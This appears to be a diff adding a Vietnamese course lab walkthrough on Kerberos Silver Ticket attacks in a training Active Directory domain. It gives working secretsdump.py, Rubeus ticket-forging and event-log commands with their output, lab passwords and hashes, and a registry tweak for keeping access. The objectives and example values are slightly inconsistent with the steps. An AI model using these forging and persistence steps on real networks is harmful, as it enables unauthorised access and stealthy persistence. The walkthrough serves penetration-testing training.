@@ -6298,6 +6298,338 @@ Trong bài thực hành này, chúng ta đã xem xét cách sử dụng người
 
 # Lab 5.4. Silver Ticket
 
+## Mục tiêu
+
+- Chúng ta sẽ sử dụng Rubeus để truy cập máy chủ tập tin (file01) với tên bgreen.
+
+- Chúng tôi sẽ sử dụng mã băm của file01 để tạo vé bạc cho dịch vụ CIFS trên file01.
+
+- Chúng tôi sẽ tạo một vé với thông tin người dùng giả mạo cho phép chúng tôi truy cập vào file01.
+
+## Thiết lập phòng thí nghiệm
+
+Máy ảo được sử dụng:
+
+- Windows 10.
+
+Chúng tôi sẽ truy cập DC cho miền `sec560.local`.
+
+Chúng tôi đã xâm nhập vào một tài khoản `SVC_SQLService2` có quyền quản trị miền trong phòng thí nghiệm Kerberoast.
+
+## Hướng dẫn thực hành từng bước
+
+Chúng ta sẽ truy cập vào DC cho tên miền hiboxy.com. Hãy nhớ rằng chúng ta đã trích xuất các mã băm mật khẩu từ tệp NTDS.dit trong bài thực hành trước, bao gồm cả mã băm tài khoản máy cho DC01$.
+
+Chúng ta có thể thực hiện cuộc tấn công này bằng nhiều công cụ khác nhau, bao gồm Mimikatz, ticketer.py từ Impacket và Rubeus. Chúng ta sẽ sử dụng Mimikatz ở đây và ticketer.py trong bài thực hành Golden Ticket.
+
+### 1. Chuẩn bị
+
+Chúng tôi đang sử dụng VPN. Chúng tôi có thể cho phép VPN kiểm soát DNS của mình, nhưng chúng tôi thường không muốn làm vậy. Nếu làm thế, tổ chức mục tiêu sẽ biết tất cả những gì chúng tôi đang truy vấn, điều mà chúng tôi không muốn. Ngoài ra, họ có thể có tính năng lọc DNS hoặc cảnh báo. Chúng tôi chắc chắn muốn tránh việc lưu trữ thêm nhật ký và đặc biệt là tránh các cảnh báo.
+
+Chúng ta cần cấu hình hệ thống Windows để chỉ sử dụng máy chủ DNS cho việc tra cứu `hiboxy.com`. Để làm điều này, chúng ta cần khởi chạy cửa sổ PowerShell với quyền quản trị viên. Mở liên kết trên màn hình có tiêu đề **PowerShell - Run as Administrator**.
+
+![alt text](IMG/LAB5/LAB5.4/image.png)
+
+Bây giờ, hãy cấu hình DNS để truy vấn `10.130.10.10` CHỈ cho `hiboxy.com`.
+
+```bash
+Add-DnsClientNrptRule -Namespace "hiboxy.com" -NameServers 10.130.10.10
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-1.png)
+
+Để tham khảo, chúng ta có thể sử dụng lệnh dưới đây trên Linux, nhưng chúng ta đã cấu hình sẵn hệ thống bằng cách thêm mạng ( /etc/systemd/network/sec560-lab.network).
+
+```bash
+sudo systemd-resolve -i tun0 --set-dns=10.130.10.10 --set-domain=hiboxy.com
+```
+
+### 2. Kiểm tra quyền truy cập của bgreen
+
+Hãy khởi chạy cmd.exe với quyền bgreen bằng lệnh `runas`. Chúng ta cần chỉ định người dùng bằng lệnh `/user:domain\username`. Chúng ta cũng sẽ sử dụng tùy chọn `/netonly`. Tùy chọn này chỉ dành cho kết nối từ xa, vì bgreen không có quyền trên máy ảo Windows của chúng ta.
+
+```bash
+runas /user:hiboxy.com\bgreen /netonly cmd.exe
+# Khi được yêu cầu, hãy nhập mật khẩu Password1.
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-2.png)
+
+Lệnh này sẽ mở một cửa sổ mới. Trong cửa sổ mới này, hãy thử liệt kê các thư mục trong thư mục `\\file01.hiboxy.com\c$` chia sẻ.
+
+```bash
+dir \\file01.hiboxy.com\c$
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-3.png)
+
+Như đã thấy ở trên, `bgreen` không có quyền truy cập vào hệ thống này.
+
+Hãy cấp quyền truy cập bằng vé bạc cho người dùng này!
+
+### 3. Thu thập thông tin để tạo vé
+
+Giờ bạn có thể đóng cửa sổ vừa bật lên. Tiêu đề của nó là `cmd.exe (running as hiboxy.com\bgreen)`. Thực ra chúng ta không cần quyền quản trị nữa. Tất cả các thao tác còn lại có thể được thực hiện với tư cách người dùng thông thường. Điều này rất quan trọng cần biết vì chúng ta có thể thực hiện cuộc tấn công này trên một máy chủ đã tham gia miền với tư cách người dùng thông thường. Trong trường hợp của chúng ta, hệ thống Windows là hệ thống tấn công không được tham gia vào miền.
+
+Hãy tạo Vé Bạc bằng Rubeus. Chúng ta cần một vài thứ:
+
+- Mã băm NT cho dịch vụ mục tiêu.
+
+- SID miền.
+
+Trước tiên, hãy lấy SID của miền. Chúng ta đã cài đặt Impacket trong máy ảo Windows của bạn. Chúng ta sẽ sử dụng `lookupsid.py` công cụ này để lấy SID (Mã định danh bảo mật) cho các đối tượng miền. SID của Windows có định dạng `<SID>` với `<RID> S-1-5-21-XXXXXXXXXX-YYYYYYYYYYY-ZZZZZZZZZZ-RID`. SID của mỗi mục trong miền, ngoại trừ RID (Mã định danh tương đối) ở cuối, sẽ thay đổi. Chúng ta cần phần cơ sở của SID. Hãy sử dụng công cụ này để trích xuất SID cơ sở và tất cả các RID đến, nhưng không bao gồm, 520.
+
+Mở một cửa sổ dòng lệnh cmd.exe mới và chạy lệnh bên dưới để lấy SID.
+
+```bash
+lookupsid.py hiboxy.com/bgreen:Password1@10.130.10.10 520
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-5.png)
+
+```bash
+C:\Users\sec560>lookupsid.py hiboxy.com/bgreen:Password1@10.130.10.10 520
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Brute forcing SIDs at 10.130.10.10
+[*] StringBinding ncacn_np:10.130.10.10[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-1165364801-2165540956-2109386109
+498: HIBOXY\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: HIBOXY\Administrator (SidTypeUser)
+501: HIBOXY\Guest (SidTypeUser)
+502: HIBOXY\krbtgt (SidTypeUser)
+512: HIBOXY\Domain Admins (SidTypeGroup)
+513: HIBOXY\Domain Users (SidTypeGroup)
+514: HIBOXY\Domain Guests (SidTypeGroup)
+515: HIBOXY\Domain Computers (SidTypeGroup)
+516: HIBOXY\Domain Controllers (SidTypeGroup)
+517: HIBOXY\Cert Publishers (SidTypeAlias)
+518: HIBOXY\Schema Admins (SidTypeGroup)
+519: HIBOXY\Enterprise Admins (SidTypeGroup)
+```
+
+Chúng ta sẽ nhắm mục tiêu vào máy chủ `file01`. Chúng ta cần mã băm NT cho tài khoản máy tính `FILE01$`. Chúng ta có thể yêu cầu mã băm này bằng cách sử dụng thông tin đăng nhập Quản trị viên miền mà chúng ta đã tìm thấy trong bài thực hành trước.
+
+Như bạn còn nhớ, mật khẩu cho `SVC_SQLService2` là `^Cakemaker`. Ký tự `^` là một ký tự đặc biệt trên Windows, vì vậy chúng ta cần phải thoát nó bằng một ký tự khác `^` (dấu mũ).
+
+```bash
+secretsdump.py hiboxy.com/SVC_SQLService2:^^Cakemaker@10.130.10.10 -just-dc-user file01$
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-6.png)
+
+```txt
+C:\Users\sec560>secretsdump.py hiboxy.com/SVC_SQLService2:^^Cakemaker@10.130.10.10 -just-dc-user file01$
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+FILE01$:1115:aad3b435b51404eeaad3b435b51404ee:37dcd1fcb35878ca4a29d541dd37f2e3:::
+[*] Kerberos keys grabbed
+FILE01$:aes256-cts-hmac-sha1-96:ae2d925dfd841bd1e345db16860f434870be0e8dd53a944e4870564ffbf44509
+FILE01$:aes128-cts-hmac-sha1-96:5a75c2a27a6d4fc67441c5c9f5a2cc6d
+FILE01$:des-cbc-md5:a73b29622a5d9e08
+[*] Cleaning up...
+```
+
+> Hash là động: Mã băm ở trên được tạo ngẫu nhiên khi phòng thí nghiệm được xây dựng. Hãy sử dụng mã băm hiển thị trên màn hình của bạn, chứ không phải mã băm ở trên!
+
+### 4. Tạo vé bằng Rubeus
+
+Chúng ta sẽ sử dụng Rubeus cho bài thực hành này. Rubeus là một bộ công cụ (được viết bằng C#) để tương tác và thao tác với Kerberos.
+
+Dưới đây là các tùy chọn chúng ta sẽ sử dụng với Rubeus:
+
+- `silver`: Tính năng "Vé Bạc" trong Rubeus.
+
+- `/user:bgreen`: Người dùng mà chúng ta sẽ trình bày trong phiếu yêu cầu hỗ trợ là ai?
+
+- `/service:cifs/file01.hiboxy.com`: Chúng ta sẽ nhắm mục tiêu vào cifs(Hệ thống tệp Internet chung (Common Internet File System - SMB) - một biến thể của SMB, được sử dụng với các thư mục chia sẻ tệp).
+
+- `/rc4:NT_HASH_FROM_secretsdump.py`: Chúng ta sẽ tạo vé bằng cách sử dụng RC4 và mã băm NT được tạo ra từ secretsdump.py.
+
+- `/sid:S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ`: SID từ lookupsid.py
+
+- `/ptt`: Tải vé vào bộ nhớ để chúng ta có thể sử dụng.
+
+> Hãy thay thế REDACTED_32768ffb592bbf94774b40bằng mã băm NT từ secretsdump.py. Trong ví dụ của chúng tôi, đó là 32768ffb5fb3982538802bbf94774b40, nhưng của bạn sẽ khác.
+>
+> Hãy thay thế S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZbằng SID từ lookupsid.py. Trong ví dụ của chúng tôi, đó là S-1-5-21-2874468612-3742211749-3992750886, nhưng của bạn sẽ khác.
+
+```bash
+C:\Tools\Rubeus.exe silver /service:cifs/file01.hiboxy.com /rc4:37dcd1fcb35878ca4a29d541dd37f2e3 /sid:S-1-5-21-1165364801-2165540956-2109386109 /ptt /user:bgreen
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-7.png)
+
+![alt text](IMG/LAB5/LAB5.4/image-8.png)
+
+```txt
+C:\Users\sec560>C:\Tools\Rubeus.exe silver /service:cifs/file01.hiboxy.com /rc4:37dcd1fcb35878ca4a29d541dd37f2e3 /sid:S-1-5-21-1165364801-2165540956-2109386109 /ptt /user:bgreen
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.0
+
+[*] Action: Build TGS
+
+[*] Building PAC
+
+[*] Domain         : HIBOXY.COM (HIBOXY)
+[*] SID            : S-1-5-21-1165364801-2165540956-2109386109
+[*] UserId         : 500
+[*] Groups         : 520,512,513,519,518
+[*] ServiceKey     : 37DCD1FCB35878CA4A29D541DD37F2E3
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+[*] KDCKey         : 37DCD1FCB35878CA4A29D541DD37F2E3
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
+[*] Service        : cifs
+[*] Target         : file01.hiboxy.com
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGS for 'bgreen' to 'cifs/file01.hiboxy.com'
+
+[*] AuthTime       : 4/4/2026 6:02:56 AM
+[*] StartTime      : 4/4/2026 6:02:56 AM
+[*] EndTime        : 4/4/2026 4:02:56 PM
+[*] RenewTill      : 4/11/2026 6:02:56 AM
+
+[*] base64(ticket.kirbi):
+
+      doIFEzCCBQ+gAwIBBaEDAgEWooIEGDCCBBRhggQQMIIEDKADAgEFoQwbCkhJQk9YWS5DT02iJDAioAMC
+      AQKhGzAZGwRjaWZzGxFmaWxlMDEuaGlib3h5LmNvbaOCA88wggPLoAMCARehAwIBA6KCA70EggO5lRSC
+      vf2Jdl+a8h8hjh6+j0ipJKZey5zVXCJup4K8utY9pLjCUZtJZWwbHFZsmlNnyHVybPMu0XTjv2rMdLaX
+      xIy36gAbcsFh3P/KMympEq6YXTLMk4Ofq2tZKkE4+0u6XTotJmSROcS0JBCkkI/8mcfEnte3knadjXi4
+      wJIFcQX6hd915ntOSzTVrFUp9X2RKrEQZ5mTDw6CGSKWPyCZLW+e7UAMaJk/3L7VwQk+1CKonO4lSg1h
+      497iCRZqvSYw1uD2zR/WbUMvwjQwMWt/OTQBqJWytiAR5ZGkKqT3QR7Dnp4e8JCfWXMUEL9ZJC7Omkdn
+      8xaDXJ/iB+nPeBV7MVEXicuq2+GpUIsk0eJTB0pGaRDkGzaOKxo9e7TgMSjhAuno+rtyesj9llzLjVW2
+      CDOt9CJrg926Nh1VYP0XrLkUQ8Ci1Qzi3BoGcxlYVBjSj0rtaN0H4rgFCbuUAT7aO9I1WbvvwS2LXTuv
+      TdQBlpzgV0caqU1KaU7pa/qHtcynlBzLW9C7Qg007GDypWmR0K3yObGEmghKZ9iL0ioLh8vKsmcTz2VE
+      oLcPcuOB1L2DPYOYKs/s9rlO2tvwVXMKaFmpAcBmnUUcW4MNz6Tm7Pkpl0TwljzY7IrO+53tYA5CVzXK
+      yeg9b4vvrzMj4bd+nhV7r5GrJAcfaNF1j4FFRoARvib+4P0+2JZ1g1nyi5ueQXC73i6igIlk9/IvQC69
+      1T3Fr5aDilTQ0K7JXkdfiFpbuK1DTpV2GliW5n7L/FgU8lwKs6KzG5FMO0w8CmYQpwTQSVEpNNp0u53T
+      7yFJNYYajb7wIwU/LUgOAiT1oVo0+tgiXUYqa4eTkQO5j9nasUsJtISAhPZUpDOqFW3oFeRFNW50XDtj
+      yfbzowelpsMSjRvabUOCWl0Hi7FK35ZJ8FtYs0mDi8i8XB6jnabOYWYq69IN9NyfVA+MJ9JRdaEHDof1
+      lWCcerg1mA0A3P4mF4C2rckaHba8/yPqQzG2s51vHtr67wNwstp5RN2t97Sjl+gCWoOpYToQRzXpGE7G
+      Z4uEosj/s8BnsM5dFlhFoQjAGNU16SJm81JOpVVvZeTrY0vfOlO3t1VnysIjeHTwidRmtwQylAPNa7Fl
+      NfQHcrmgRAgYvN70F1r3XlFc8UjTeChFfm723BkY+CKjLQCpfkcHsQorZBOuTdTsvv7Nnt60e3FIIxZK
+      4DxoSeU5+x2gl4JNi06qWhf0dE+ilunB4svGWk4I+jzV8MxNJEp+QIRP6KVbWTWU4xGjgeYwgeOgAwIB
+      AKKB2wSB2H2B1TCB0qCBzzCBzDCByaAbMBmgAwIBF6ESBBCNLcADT+10e9gBdI9hC+FToQwbCkhJQk9Y
+      WS5DT02iEzARoAMCAQGhCjAIGwZiZ3JlZW6jBwMFAECgAACkERgPMjAyNjA0MDQwNjAyNTZapREYDzIw
+      MjYwNDA0MDYwMjU2WqYRGA8yMDI2MDQwNDE2MDI1NlqnERgPMjAyNjA0MTEwNjAyNTZaqAwbCkhJQk9Y
+      WS5DT02pJDAioAMCAQKhGzAZGwRjaWZzGxFmaWxlMDEuaGlib3h5LmNvbQ==
+
+
+[+] Ticket successfully imported!
+```
+
+Kết quả hiển thị thông tin về vé mà chúng ta đã tạo. Nó cũng cho thấy vé đã được tải thành công vào bộ nhớ.
+
+Hãy kiểm tra vé trong bộ nhớ bằng lệnh `klist.exe`.
+
+```bash
+klist
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-9.png)
+
+Bây giờ, hãy thử truy cập máy chủ tập tin!
+
+```bash
+dir \\file01.hiboxy.com\c$
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-10.png)
+
+Bạn đã kết nối thành công với máy chủ từ xa bằng vé Kerberos dành cho `bgreen`, nhưng với tư cách là quản trị viên!
+
+### 5. Vé giả thứ hai
+
+Hãy tạo một phiếu yêu cầu mới, nhưng hãy chỉnh sửa nó nhiều hơn nữa!
+
+Ở lần tạo ticket trước, chúng ta đã cấp quyền Quản trị cho bgreen. Giờ chúng ta sẽ giả mạo tên người dùng và RID!
+
+Trước tiên, chúng ta cần xóa các vé khỏi bộ nhớ.
+
+```bash
+klist purge
+```
+![alt text](IMG/LAB5/LAB5.4/image-11.png)
+
+Nhấn phím mũi tên lên vài lần cho đến khi bạn quay lại lệnh Rubeus. Chúng ta sẽ sửa đổi `/user` và cung cấp một giá trị giả `/id` là 777.
+
+```bash
+# C:\Tools\Rubeus.exe silver /service:cifs/file01.hiboxy.com /rc4:32768ffb5fb3982538802bbf94774b40 /sid:S-1-5-21-2874468612-3742211749-3992750886 /ptt /user:pwned /id:777
+
+C:\Tools\Rubeus.exe silver /service:cifs/file01.hiboxy.com /rc4:37dcd1fcb35878ca4a29d541dd37f2e3 /sid:S-1-5-21-1165364801-2165540956-2109386109 /ptt /user:pwned /id:777
+
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-12.png)
+
+Hãy chú ý đến tên vé mới!
+
+Hãy xem liệu cách này có hiệu quả không.
+
+```bash
+dir \\file01.hiboxy.com\c$
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-13.png)
+
+Nó đã hoạt động!
+
+"serviceclass" là phần của vé trước tên miền đầy đủ (FQDN) của file01.hiboxy.com. Trong ví dụ trước, chúng ta sử dụng serviceclass `cifs`. Mỗi service class cho phép chúng ta kết nối với một dịch vụ khác nhau. Hãy tạo một service class khác cho phép chúng ta truy vấn nhật ký sự kiện của hệ thống từ xa. Sử dụng cùng thông tin trong vé này, nhưng thay thế `cifs` bằng `host`.
+
+```bash
+# C:\Tools\Rubeus.exe silver /service:host/file01.hiboxy.com /rc4:32768ffb5fb3982538802bbf94774b40 /sid:S-1-5-21-2874468612-3742211749-3992750886 /ptt /user:pwned /id:777
+
+C:\Tools\Rubeus.exe silver /service:host/file01.hiboxy.com /rc4:37dcd1fcb35878ca4a29d541dd37f2e3 /sid:S-1-5-21-1165364801-2165540956-2109386109 /ptt /user:pwned /id:777
+
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-14.png)
+
+Bạn sẽ thấy vé mới cho hostdịch vụ này. Chúng ta hãy xem lại vé để xác nhận nhé.
+
+```bash
+klist
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-15.png)
+
+Bạn sẽ thấy vé cho `host/file01.hiboxy.com` và `cifs/file01.hiboxy.com`.
+
+Chúng ta đã xác nhận truy cập máy chủ thông qua SMB/CIFS, hãy xem nhật ký sự kiện để xem nó trông như thế nào khi chúng ta truy cập hệ thống.
+
+```bash
+wevtutil /r:file01.hiboxy.com qe Security "/q:*[System/EventID=4624] and *[EventData/Data[@Name='TargetUserName']='pwned']" /f:text /c:1
+```
+
+![alt text](IMG/LAB5/LAB5.4/image-16.png)
+
+Hãy nhìn vào phần RID của SID, đó là ID giả của chúng ta `777`. "Tên tài khoản" là tên người dùng giả của chúng ta pwned!
+
+Hãy nghĩ xem điều này mạnh mẽ đến mức nào đối với việc duy trì quyền truy cập. Chúng ta không cần tên người dùng hoặc mật khẩu, và chúng ta có thể giả mạo bất kỳ người dùng nào, thậm chí là tài khoản giả! Tuy nhiên, mã băm tài khoản máy tính thường được thay đổi mỗi tháng. Kẻ tấn công độc hại đã vô hiệu hóa quá trình thay đổi này bằng cách thay đổi khóa registry sau thành `1:HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange`.
+
+Chúng ta không thể làm những việc tương tự với Vé Vàng, điều mà chúng ta sẽ đề cập đến tiếp theo. Do một bản vá lỗi, bạn không thể sử dụng tên tài khoản giả nữa vì DC sẽ kiểm tra ID và tên để đảm bảo chúng tồn tại và trùng khớp.
+
+Chúng ta có thể sử dụng các công cụ khác cho cùng loại tấn công như ticketer.py (chúng ta sẽ sử dụng công cụ này ở phần tiếp theo!) và Mimikatz.
+
+## Phần kết luận
+
+Trong bài thực hành này, chúng ta đã tạo một vé bạc cho dịch vụ CIFS trên FILE01, sử dụng mã băm tài khoản máy FILE01$. Vé bạc chỉ cấp quyền truy cập vào dịch vụ mục tiêu được chỉ định và chúng ta đã đánh cắp được mã băm hoặc mật khẩu. Trong trường hợp này, dịch vụ CIFS có thể được sử dụng để thiết lập quyền truy cập lâu dài một cách lén lút. Nếu còn thời gian, hãy thoải mái thử nghiệm việc thiết lập quyền truy cập lâu dài trong thực tế hoặc thử nghiệm với vé bạc và vé vàng cùng quyền truy cập mà chúng cung cấp.
+
+
 # Lab 5.5. Golden Ticket
 
 Trước khi bắt đầu, vui lòng chạy lệnh này trong máy ảo Slingshot Linux của bạn.
